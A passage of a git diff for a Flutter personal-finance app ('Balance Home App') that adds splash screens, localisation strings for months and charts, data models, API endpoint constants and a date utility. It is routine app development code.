b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxxhdpi\/android12splash.png\nnew file mode 100644\nindex 0000000..fc566c5\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxxhdpi\/android12splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxxhdpi\/splash.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxxhdpi\/splash.png\nnew file mode 100644\nindex 0000000..fc566c5\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable-xxxhdpi\/splash.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/background.png b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/background.png\nnew file mode 100644\nindex 0000000..adf9c61\nBinary files \/dev\/null and b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/background.png differ\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/launch_background.xml b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/launch_background.xml\nindex 304732f..3cc4948 100644\n--- a\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/launch_background.xml\n+++ b\/frontend\/flutter\/android\/app\/src\/main\/res\/drawable\/launch_background.xml\n@@ -1,12 +1,9 @@\n <?xml version=\"1.0\" encoding=\"utf-8\"?>\n-<!-- Modify this file to customize your launch splash screen -->\n <layer-list xmlns:android=\"http:\/\/schemas.android.com\/apk\/res\/android\">\n-    <item android:drawable=\"@android:color\/white\" \/>\n-\n-    <!-- You can insert your own image assets here -->\n-    <!-- <item>\n-        <bitmap\n-            android:gravity=\"center\"\n-            android:src=\"@mipmap\/launch_image\" \/>\n-    <\/item> -->\n+    <item>\n+        <bitmap android:gravity=\"fill\" android:src=\"@drawable\/background\"\/>\n+    <\/item>\n+    <item>\n+        <bitmap android:gravity=\"center\" android:src=\"@drawable\/splash\"\/>\n+    <\/item>\n <\/layer-list>\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/values-night-v31\/styles.xml b\/frontend\/flutter\/android\/app\/src\/main\/res\/values-night-v31\/styles.xml\nnew file mode 100644\nindex 0000000..edaf89e\n--- \/dev\/null\n+++ b\/frontend\/flutter\/android\/app\/src\/main\/res\/values-night-v31\/styles.xml\n@@ -0,0 +1,21 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<resources>\n+    <!-- Theme applied to the Android Window while the process is starting when the OS's Dark Mode setting is off -->\n+    <style name=\"LaunchTheme\" parent=\"@android:style\/Theme.Black.NoTitleBar\">\n+        <item name=\"android:forceDarkAllowed\">false<\/item>\n+        <item name=\"android:windowFullscreen\">false<\/item>\n+        <item name=\"android:windowLayoutInDisplayCutoutMode\">shortEdges<\/item>\n+        <item name=\"android:windowSplashScreenBackground\">#fdffcd<\/item>\n+        <item name=\"android:windowSplashScreenAnimatedIcon\">@drawable\/android12splash<\/item>\n+        <item name=\"android:windowSplashScreenIconBackgroundColor\">#8F8F5C<\/item>\n+    <\/style>\n+    <!-- Theme applied to the Android Window as soon as the process has started.\n+         This theme determines the color of the Android Window while your\n+         Flutter UI initializes, as well as behind your Flutter UI while its\n+         running.\n+         \n+         This Theme is only used starting with V2 of Flutter's Android embedding. -->\n+    <style name=\"NormalTheme\" parent=\"@android:style\/Theme.Black.NoTitleBar\">\n+        <item name=\"android:windowBackground\">?android:colorBackground<\/item>\n+    <\/style>\n+<\/resources>\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/values-v31\/styles.xml b\/frontend\/flutter\/android\/app\/src\/main\/res\/values-v31\/styles.xml\nnew file mode 100644\nindex 0000000..eab2bc5\n--- \/dev\/null\n+++ b\/frontend\/flutter\/android\/app\/src\/main\/res\/values-v31\/styles.xml\n@@ -0,0 +1,21 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<resources>\n+    <!-- Theme applied to the Android Window while the process is starting when the OS's Dark Mode setting is off -->\n+    <style name=\"LaunchTheme\" parent=\"@android:style\/Theme.Light.NoTitleBar\">\n+        <item name=\"android:forceDarkAllowed\">false<\/item>\n+        <item name=\"android:windowFullscreen\">false<\/item>\n+        <item name=\"android:windowLayoutInDisplayCutoutMode\">shortEdges<\/item>\n+        <item name=\"android:windowSplashScreenBackground\">#fdffcd<\/item>\n+        <item name=\"android:windowSplashScreenAnimatedIcon\">@drawable\/android12splash<\/item>\n+        <item name=\"android:windowSplashScreenIconBackgroundColor\">#8F8F5C<\/item>\n+    <\/style>\n+    <!-- Theme applied to the Android Window as soon as the process has started.\n+         This theme determines the color of the Android Window while your\n+         Flutter UI initializes, as well as behind your Flutter UI while its\n+         running.\n+         \n+         This Theme is only used starting with V2 of Flutter's Android embedding. -->\n+    <style name=\"NormalTheme\" parent=\"@android:style\/Theme.Light.NoTitleBar\">\n+        <item name=\"android:windowBackground\">?android:colorBackground<\/item>\n+    <\/style>\n+<\/resources>\ndiff --git a\/frontend\/flutter\/android\/app\/src\/main\/res\/values\/styles.xml b\/frontend\/flutter\/android\/app\/src\/main\/res\/values\/styles.xml\nindex cb1ef88..82c1a05 100644\n--- a\/frontend\/flutter\/android\/app\/src\/main\/res\/values\/styles.xml\n+++ b\/frontend\/flutter\/android\/app\/src\/main\/res\/values\/styles.xml\n@@ -5,6 +5,9 @@\n         <!-- Show a splash screen on the activity. Automatically removed when\n              the Flutter engine draws its first frame -->\n         <item name=\"android:windowBackground\">@drawable\/launch_background<\/item>\n+        <item name=\"android:forceDarkAllowed\">false<\/item>\n+        <item name=\"android:windowFullscreen\">false<\/item>\n+        <item name=\"android:windowLayoutInDisplayCutoutMode\">shortEdges<\/item>\n     <\/style>\n     <!-- Theme applied to the Android Window as soon as the process has started.\n          This theme determines the color of the Android Window while your\ndiff --git a\/frontend\/flutter\/assets\/images\/balance_home_app_icon.png b\/frontend\/flutter\/assets\/images\/balance_home_app_icon.png\nindex c7b795a..062e841 100644\nBinary files a\/frontend\/flutter\/assets\/images\/balance_home_app_icon.png and b\/frontend\/flutter\/assets\/images\/balance_home_app_icon.png differ\ndiff --git a\/frontend\/flutter\/assets\/images\/balance_home_app_splash.png b\/frontend\/flutter\/assets\/images\/balance_home_app_splash.png\nnew file mode 100644\nindex 0000000..ab99973\nBinary files \/dev\/null and b\/frontend\/flutter\/assets\/images\/balance_home_app_splash.png differ\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchBackground.imageset\/Contents.json b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchBackground.imageset\/Contents.json\nnew file mode 100644\nindex 0000000..9f447e1\n--- \/dev\/null\n+++ b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchBackground.imageset\/Contents.json\n@@ -0,0 +1,21 @@\n+{\n+  \"images\" : [\n+    {\n+      \"filename\" : \"background.png\",\n+      \"idiom\" : \"universal\",\n+      \"scale\" : \"1x\"\n+    },\n+    {\n+      \"idiom\" : \"universal\",\n+      \"scale\" : \"2x\"\n+    },\n+    {\n+      \"idiom\" : \"universal\",\n+      \"scale\" : \"3x\"\n+    }\n+  ],\n+  \"info\" : {\n+    \"author\" : \"xcode\",\n+    \"version\" : 1\n+  }\n+}\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchBackground.imageset\/background.png b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchBackground.imageset\/background.png\nnew file mode 100644\nindex 0000000..adf9c61\nBinary files \/dev\/null and b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchBackground.imageset\/background.png differ\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/Contents.json b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/Contents.json\nindex 0bedcf2..00cabce 100644\n--- a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/Contents.json\n+++ b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/Contents.json\n@@ -1,23 +1,23 @@\n {\n   \"images\" : [\n     {\n-      \"idiom\" : \"universal\",\n       \"filename\" : \"LaunchImage.png\",\n+      \"idiom\" : \"universal\",\n       \"scale\" : \"1x\"\n     },\n     {\n-      \"idiom\" : \"universal\",\n       \"filename\" : \"LaunchImage@2x.png\",\n+      \"idiom\" : \"universal\",\n       \"scale\" : \"2x\"\n     },\n     {\n-      \"idiom\" : \"universal\",\n       \"filename\" : \"LaunchImage@3x.png\",\n+      \"idiom\" : \"universal\",\n       \"scale\" : \"3x\"\n     }\n   ],\n   \"info\" : {\n-    \"version\" : 1,\n-    \"author\" : \"xcode\"\n+    \"author\" : \"xcode\",\n+    \"version\" : 1\n   }\n }\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage.png b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage.png\nindex 9da19ea..8534598 100644\nBinary files a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage.png and b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage.png differ\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@2x.png b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@2x.png\nindex 9da19ea..2311b33 100644\nBinary files a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@2x.png and b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@2x.png differ\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@3x.png b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@3x.png\nindex 9da19ea..22be0fe 100644\nBinary files a\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@3x.png and b\/frontend\/flutter\/ios\/Runner\/Assets.xcassets\/LaunchImage.imageset\/LaunchImage@3x.png differ\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Base.lproj\/LaunchScreen.storyboard b\/frontend\/flutter\/ios\/Runner\/Base.lproj\/LaunchScreen.storyboard\nindex f2e259c..7370adb 100644\n--- a\/frontend\/flutter\/ios\/Runner\/Base.lproj\/LaunchScreen.storyboard\n+++ b\/frontend\/flutter\/ios\/Runner\/Base.lproj\/LaunchScreen.storyboard\n@@ -16,13 +16,19 @@\n                     <view key=\"view\" contentMode=\"scaleToFill\" id=\"Ze5-6b-2t3\">\n                         <autoresizingMask key=\"autoresizingMask\" widthSizable=\"YES\" heightSizable=\"YES\"\/>\n                         <subviews>\n-                            <imageView opaque=\"NO\" clipsSubviews=\"YES\" multipleTouchEnabled=\"YES\" contentMode=\"center\" image=\"LaunchImage\" translatesAutoresizingMaskIntoConstraints=\"NO\" id=\"YRO-k0-Ey4\">\n-                            <\/imageView>\n+                            <imageView clipsSubviews=\"YES\" userInteractionEnabled=\"NO\" contentMode=\"scaleToFill\" image=\"LaunchBackground\" translatesAutoresizingMaskIntoConstraints=\"NO\" id=\"tWc-Dq-wcI\"\/>\n+                            <imageView opaque=\"NO\" clipsSubviews=\"YES\" multipleTouchEnabled=\"YES\" contentMode=\"center\" image=\"LaunchImage\" translatesAutoresizingMaskIntoConstraints=\"NO\" id=\"YRO-k0-Ey4\"><\/imageView>\n                         <\/subviews>\n                         <color key=\"backgroundColor\" red=\"1\" green=\"1\" blue=\"1\" alpha=\"1\" colorSpace=\"custom\" customColorSpace=\"sRGB\"\/>\n                         <constraints>\n-                            <constraint firstItem=\"YRO-k0-Ey4\" firstAttribute=\"centerX\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"centerX\" id=\"1a2-6s-vTC\"\/>\n-                            <constraint firstItem=\"YRO-k0-Ey4\" firstAttribute=\"centerY\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"centerY\" id=\"4X2-HB-R7a\"\/>\n+                            <constraint firstItem=\"YRO-k0-Ey4\" firstAttribute=\"leading\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"leading\" id=\"3T2-ad-Qdv\"\/>\n+                            <constraint firstItem=\"tWc-Dq-wcI\" firstAttribute=\"bottom\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"bottom\" id=\"RPx-PI-7Xg\"\/>\n+                            <constraint firstItem=\"tWc-Dq-wcI\" firstAttribute=\"top\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"top\" id=\"SdS-ul-q2q\"\/>\n+                            <constraint firstAttribute=\"trailing\" secondItem=\"tWc-Dq-wcI\" secondAttribute=\"trailing\" id=\"Swv-Gf-Rwn\"\/>\n+                            <constraint firstAttribute=\"trailing\" secondItem=\"YRO-k0-Ey4\" secondAttribute=\"trailing\" id=\"TQA-XW-tRk\"\/>\n+                            <constraint firstItem=\"YRO-k0-Ey4\" firstAttribute=\"bottom\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"bottom\" id=\"duK-uY-Gun\"\/>\n+                            <constraint firstItem=\"tWc-Dq-wcI\" firstAttribute=\"leading\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"leading\" id=\"kV7-tw-vXt\"\/>\n+                            <constraint firstItem=\"YRO-k0-Ey4\" firstAttribute=\"top\" secondItem=\"Ze5-6b-2t3\" secondAttribute=\"top\" id=\"xPn-NY-SIU\"\/>\n                         <\/constraints>\n                     <\/view>\n                 <\/viewController>\n@@ -32,6 +38,7 @@\n         <\/scene>\n     <\/scenes>\n     <resources>\n-        <image name=\"LaunchImage\" width=\"168\" height=\"185\"\/>\n+        <image name=\"LaunchImage\" width=\"700\" height=\"667\"\/>\n+        <image name=\"LaunchBackground\" width=\"1\" height=\"1\"\/>\n     <\/resources>\n <\/document>\ndiff --git a\/frontend\/flutter\/ios\/Runner\/Info.plist b\/frontend\/flutter\/ios\/Runner\/Info.plist\nindex ca30d67..7a27930 100644\n--- a\/frontend\/flutter\/ios\/Runner\/Info.plist\n+++ b\/frontend\/flutter\/ios\/Runner\/Info.plist\n@@ -1,51 +1,53 @@\n <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n <!DOCTYPE plist PUBLIC \"-\/\/Apple\/\/DTD PLIST 1.0\/\/EN\" \"http:\/\/www.apple.com\/DTDs\/PropertyList-1.0.dtd\">\n <plist version=\"1.0\">\n-<dict>\n-\t<key>CFBundleDevelopmentRegion<\/key>\n-\t<string>$(DEVELOPMENT_LANGUAGE)<\/string>\n-\t<key>CFBundleDisplayName<\/key>\n-\t<string>Balance Home App<\/string>\n-\t<key>CFBundleExecutable<\/key>\n-\t<string>$(EXECUTABLE_NAME)<\/string>\n-\t<key>CFBundleIdentifier<\/key>\n-\t<string>$(PRODUCT_BUNDLE_IDENTIFIER)<\/string>\n-\t<key>CFBundleInfoDictionaryVersion<\/key>\n-\t<string>6.0<\/string>\n-\t<key>CFBundleName<\/key>\n-\t<string>balance_home_app<\/string>\n-\t<key>CFBundlePackageType<\/key>\n-\t<string>APPL<\/string>\n-\t<key>CFBundleShortVersionString<\/key>\n-\t<string>$(FLUTTER_BUILD_NAME)<\/string>\n-\t<key>CFBundleSignature<\/key>\n-\t<string>????<\/string>\n-\t<key>CFBundleVersion<\/key>\n-\t<string>$(FLUTTER_BUILD_NUMBER)<\/string>\n-\t<key>LSRequiresIPhoneOS<\/key>\n-\t<true\/>\n-\t<key>UILaunchStoryboardName<\/key>\n-\t<string>LaunchScreen<\/string>\n-\t<key>UIMainStoryboardFile<\/key>\n-\t<string>Main<\/string>\n-\t<key>UISupportedInterfaceOrientations<\/key>\n-\t<array>\n-\t\t<string>UIInterfaceOrientationPortrait<\/string>\n-\t\t<string>UIInterfaceOrientationLandscapeLeft<\/string>\n-\t\t<string>UIInterfaceOrientationLandscapeRight<\/string>\n-\t<\/array>\n-\t<key>UISupportedInterfaceOrientations~ipad<\/key>\n-\t<array>\n-\t\t<string>UIInterfaceOrientationPortrait<\/string>\n-\t\t<string>UIInterfaceOrientationPortraitUpsideDown<\/string>\n-\t\t<string>UIInterfaceOrientationLandscapeLeft<\/string>\n-\t\t<string>UIInterfaceOrientationLandscapeRight<\/string>\n-\t<\/array>\n-\t<key>UIViewControllerBasedStatusBarAppearance<\/key>\n-\t<false\/>\n-\t<key>CADisableMinimumFrameDurationOnPhone<\/key>\n-\t<true\/>\n-\t<key>UIApplicationSupportsIndirectInputEvents<\/key>\n-\t<true\/>\n-<\/dict>\n+\t<dict>\n+\t\t<key>CFBundleDevelopmentRegion<\/key>\n+\t\t<string>$(DEVELOPMENT_LANGUAGE)<\/string>\n+\t\t<key>CFBundleDisplayName<\/key>\n+\t\t<string>Balance Home App<\/string>\n+\t\t<key>CFBundleExecutable<\/key>\n+\t\t<string>$(EXECUTABLE_NAME)<\/string>\n+\t\t<key>CFBundleIdentifier<\/key>\n+\t\t<string>$(PRODUCT_BUNDLE_IDENTIFIER)<\/string>\n+\t\t<key>CFBundleInfoDictionaryVersion<\/key>\n+\t\t<string>6.0<\/string>\n+\t\t<key>CFBundleName<\/key>\n+\t\t<string>balance_home_app<\/string>\n+\t\t<key>CFBundlePackageType<\/key>\n+\t\t<string>APPL<\/string>\n+\t\t<key>CFBundleShortVersionString<\/key>\n+\t\t<string>$(FLUTTER_BUILD_NAME)<\/string>\n+\t\t<key>CFBundleSignature<\/key>\n+\t\t<string>????<\/string>\n+\t\t<key>CFBundleVersion<\/key>\n+\t\t<string>$(FLUTTER_BUILD_NUMBER)<\/string>\n+\t\t<key>LSRequiresIPhoneOS<\/key>\n+\t\t<true\/>\n+\t\t<key>UILaunchStoryboardName<\/key>\n+\t\t<string>LaunchScreen<\/string>\n+\t\t<key>UIMainStoryboardFile<\/key>\n+\t\t<string>Main<\/string>\n+\t\t<key>UISupportedInterfaceOrientations<\/key>\n+\t\t<array>\n+\t\t\t<string>UIInterfaceOrientationPortrait<\/string>\n+\t\t\t<string>UIInterfaceOrientationLandscapeLeft<\/string>\n+\t\t\t<string>UIInterfaceOrientationLandscapeRight<\/string>\n+\t\t<\/array>\n+\t\t<key>UISupportedInterfaceOrientations~ipad<\/key>\n+\t\t<array>\n+\t\t\t<string>UIInterfaceOrientationPortrait<\/string>\n+\t\t\t<string>UIInterfaceOrientationPortraitUpsideDown<\/string>\n+\t\t\t<string>UIInterfaceOrientationLandscapeLeft<\/string>\n+\t\t\t<string>UIInterfaceOrientationLandscapeRight<\/string>\n+\t\t<\/array>\n+\t\t<key>UIViewControllerBasedStatusBarAppearance<\/key>\n+\t\t<false\/>\n+\t\t<key>CADisableMinimumFrameDurationOnPhone<\/key>\n+\t\t<true\/>\n+\t\t<key>UIApplicationSupportsIndirectInputEvents<\/key>\n+\t\t<true\/>\n+\t\t<key>UIStatusBarHidden<\/key>\n+\t\t<false\/>\n+\t<\/dict>\n <\/plist>\ndiff --git a\/frontend\/flutter\/lib\/lang\/app_en.arb b\/frontend\/flutter\/lib\/lang\/app_en.arb\nindex 642a184..df87122 100644\n--- a\/frontend\/flutter\/lib\/lang\/app_en.arb\n+++ b\/frontend\/flutter\/lib\/lang\/app_en.arb\n@@ -9,6 +9,20 @@\n     \"appTitle\": \"BalHom\",\n     \"appTitle1\": \"Bal\",\n     \"appTitle2\": \"Hom\",\n+    \n+    \"@_MONTHS\":{},\n+    \"january\": \"Jan\",\n+    \"february\": \"Feb\",\n+    \"march\": \"Mar\",\n+    \"april\": \"Apr\",\n+    \"may\": \"May\",\n+    \"june\": \"Jun\",\n+    \"july\": \"Jul\",\n+    \"august\": \"Aug\",\n+    \"september\": \"Sep\",\n+    \"october\": \"Oct\",\n+    \"november\": \"Nov\",\n+    \"december\": \"Dec\",\n \n     \"@_APP_ERRORS\":{},\n     \"noInternet\": \"Could not connect to the internet, check your connection and try again later\",\n@@ -77,5 +91,11 @@\n     \"resetPasswordAdvice\": \"If you forgot your password then you must enter a new one and verify the code sent to your email\",\n     \"needInvitationCode\": \"Invitation code needed\",\n     \"invitationCodeNotValid\": \"Invitation code not valid\",\n-    \"needCoinType\": \"Coin type needed\"\n+    \"needCoinType\": \"Coin type needed\",\n+\n+    \"@_STATISTICS\":{},\n+    \"balanceChartTitle\": \"Revenues and expenses for\",\n+    \"savingsChartTitle\": \"Savings for\",\n+    \"savingsEightChartTitle\": \"Last 8 years savings\",\n+    \"currencyChartTitle\": \"Currency exchange\"\n }\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/data\/models\/balance_years_model.dart b\/frontend\/flutter\/lib\/src\/core\/data\/models\/balance_years_model.dart\nnew file mode 100644\nindex 0000000..38e96be\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/core\/data\/models\/balance_years_model.dart\n@@ -0,0 +1,25 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'balance_years_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class BalanceYearsModel extends Equatable {\n+\n+  final List<int> years;\n+\n+  const BalanceYearsModel({\n+    required this.years\n+  });\n+\n+  \/\/ Json Serializable\n+  factory BalanceYearsModel.fromJson(Map<String, dynamic> json) =>\n+    _$BalanceYearsModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$BalanceYearsModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    years\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/data\/models\/min_max_model.dart b\/frontend\/flutter\/lib\/src\/core\/data\/models\/min_max_model.dart\nnew file mode 100644\nindex 0000000..ee1e946\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/core\/data\/models\/min_max_model.dart\n@@ -0,0 +1,17 @@\n+import 'package:equatable\/equatable.dart';\n+\n+class MinMaxModel extends Equatable {\n+\n+  final double min;\n+  final double max;\n+\n+  const MinMaxModel({\n+    required this.min,\n+    required this.max\n+  });\n+\n+  @override\n+  List<Object?> get props => [\n+    min, max\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/data\/models\/pagination_model.dart b\/frontend\/flutter\/lib\/src\/core\/data\/models\/pagination_model.dart\nindex 15006da..9697713 100644\n--- a\/frontend\/flutter\/lib\/src\/core\/data\/models\/pagination_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/core\/data\/models\/pagination_model.dart\n@@ -3,7 +3,7 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'pagination_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class PaginationModel extends Equatable {\n \n   final int count;\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/data\/models\/years_model.dart b\/frontend\/flutter\/lib\/src\/core\/data\/models\/years_model.dart\nnew file mode 100644\nindex 0000000..149b390\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/core\/data\/models\/years_model.dart\n@@ -0,0 +1,23 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'years_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class YearsModel extends Equatable {\n+\n+  final List<int> years;\n+\n+  const YearsModel({\n+    required this.years,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory YearsModel.fromJson(Map<String, dynamic> json) =>\n+    _$YearsModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$YearsModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/env\/environment_config.dart b\/frontend\/flutter\/lib\/src\/core\/env\/environment_config.dart\nindex 3bcfeb6..aaa8f84 100644\n--- a\/frontend\/flutter\/lib\/src\/core\/env\/environment_config.dart\n+++ b\/frontend\/flutter\/lib\/src\/core\/env\/environment_config.dart\n@@ -1,5 +1,11 @@\n+import 'package:envied\/envied.dart';\n+\n+part 'environment_config.g.dart';\n+\n \/\/ This class contains all the environment variables\n-class EnvironmentConfig {\n+@Envied(path: '.env', obfuscate: true)\n+abstract class EnvironmentConfig {\n   \/\/\/ URL for API\n-  static const apiUrl = String.fromEnvironment('API_URL');\n+  @EnviedField(varName: \"API_URL\")\n+  static final apiUrl = _EnvironmentConfig.apiUrl;\n }\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/services\/api_contract.dart b\/frontend\/flutter\/lib\/src\/core\/services\/api_contract.dart\nindex 0387813..4cd935b 100644\n--- a\/frontend\/flutter\/lib\/src\/core\/services\/api_contract.dart\n+++ b\/frontend\/flutter\/lib\/src\/core\/services\/api_contract.dart\n@@ -44,13 +44,13 @@ class APIContract {\n    * ============ Annual balance ============ *\n    *\/\n   \/\/\/ [GET] Returns annual balance\n-  static const String annualBalanceList = \"api\/v1\/annual_balance\";\n+  static const String annualBalance = \"api\/v1\/annual_balance\";\n   \n   \/*\n    * ============ Monthly balance ============ *\n    *\/\n   \/\/\/ [GET] Returns monthly balance\n-  static const String monthlyBalanceList = \"api\/v1\/monthly_balance\";\n+  static const String monthlyBalance = \"api\/v1\/monthly_balance\";\n   \n   \/*\n    * ============ Coin ============ *\n@@ -67,6 +67,8 @@ class APIContract {\n   static const String revenue = \"api\/v1\/revenue\";\n   \/\/\/ [GET] Returns revenue type\n   static const String revenueType = \"api\/v1\/revenue\/type\";\n+  \/\/\/ [GET] Returns revenue years\n+  static const String revenueYears = \"api\/v1\/revenue\/years\";\n   \n   \/*\n    * ============ Expense ============ *\n@@ -75,4 +77,6 @@ class APIContract {\n   static const String expense = \"api\/v1\/expense\";\n   \/\/\/ [GET] Returns expense type\n   static const String expenseType = \"api\/v1\/expense\/type\";\n+  \/\/\/ [GET] Returns expense years\n+  static const String expenseYears = \"api\/v1\/expense\/years\";\n }\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/services\/platform_service.dart b\/frontend\/flutter\/lib\/src\/core\/services\/platform_service.dart\nindex a43daae..f445ab5 100644\n--- a\/frontend\/flutter\/lib\/src\/core\/services\/platform_service.dart\n+++ b\/frontend\/flutter\/lib\/src\/core\/services\/platform_service.dart\n@@ -14,6 +14,7 @@ class PlatformService {\n           defaultTargetPlatform == TargetPlatform.iOS) &&\n       !isWeb;\n \n+  \/\/ Whether is desktop or web environment\n   bool get isDesktopOrWeb =>\n       defaultTargetPlatform == TargetPlatform.windows ||\n       defaultTargetPlatform == TargetPlatform.macOS ||\n@@ -24,23 +25,17 @@ class PlatformService {\n   \/\/\/\n   \/\/\/ Web is not included.\n   TargetPlatform get targetPlatform => defaultTargetPlatform;\n-\n-  \/\/\/ Gets the side of the screen with the shortest distance\n-  \/\/\/ from the device, and compares it with a magic number\n-  \/\/\/ used to classify wide screens.\n-  \/\/\/\n-  \/\/\/ For convenience, 600 is usually used for 7 inches tablets,\n-  \/\/\/ but there are exceptions such as the *Nexus 7 2012* whose\n-  \/\/\/ value is 552, therefore it is preferred to use 550.\n-  bool get wideUi =>\n-      MediaQueryData.fromWindow(WidgetsBinding.instance.window)\n-          .size\n-          .shortestSide >=\n-      550;\n   \n-  bool isLargeScreen(BuildContext context) =>\n+  \/\/ Whether the platform window is considered as large\n+  bool isLargeWindow(BuildContext context) =>\n     getWindowType(context) >= AdaptiveWindowType.large;\n   \n-  bool isMediumScreen(BuildContext context) =>\n+  \/\/ Whether the platform window is considered as medium\n+  bool isMediumWindow(BuildContext context) =>\n     getWindowType(context) == AdaptiveWindowType.medium;\n+  \n+  \/\/ Whether the platform window is considered as small\n+  bool isSmallWindow(BuildContext context) =>\n+    getWindowType(context) == AdaptiveWindowType.small \n+    || getWindowType(context) == AdaptiveWindowType.xsmall;\n }\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/utils\/date_util.dart b\/frontend\/flutter\/lib\/src\/core\/utils\/date_util.dart\nnew file mode 100644\nindex 0000000..95bc4e5\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/core\/utils\/date_util.dart\n@@ -0,0 +1,54 @@\n+import 'package:flutter_gen\/gen_l10n\/app_localizations.dart';\n+\n+class DateUtil {\n+  static String monthNumToString(int month, AppLocalizations appLocalizations) {\n+    switch (month) {\n+      case 1: return appLocalizations.january;\n+      case 2: return appLocalizations.february;\n+      case 3: return appLocalizations.march;\n+      case 4: return appLocalizations.april;\n+      case 5: return appLocalizations.may;\n+      case 6: return appLocalizations.june;\n+      case 7: return appLocalizations.july;\n+      case 8: return appLocalizations.august;\n+      case 9: return appLocalizations.september;\n+      case 10: return appLocalizations.october;\n+      case 11: return appLocalizations.november;\n+      case 12: return appLocalizations.december;\n+    }\n+    return appLocalizations.january;\n+  }\n+\n+  static int monthStringToNum(String month, AppLocalizations appLocalizations) {\n+    if (month == appLocalizations.january) return 1;\n+    if (month == appLocalizations.february) return 2;\n+    if (month == appLocalizations.march) return 3;\n+    if (month == appLocalizations.april) return 4;\n+    if (month == appLocalizations.may) return 5;\n+    if (month == appLocalizations.june) return 6;\n+    if (month == appLocalizations.july) return 7;\n+    if (month == appLocalizations.august) return 8;\n+    if (month == appLocalizations.september) return 9;\n+    if (month == appLocalizations.october) return 10;\n+    if (month == appLocalizations.november) return 11;\n+    if (month == appLocalizations.december) return 12;\n+    return -1;\n+  }\n+\n+  static List<String> getMonthList(AppLocalizations appLocalizations) {\n+    return [\n+      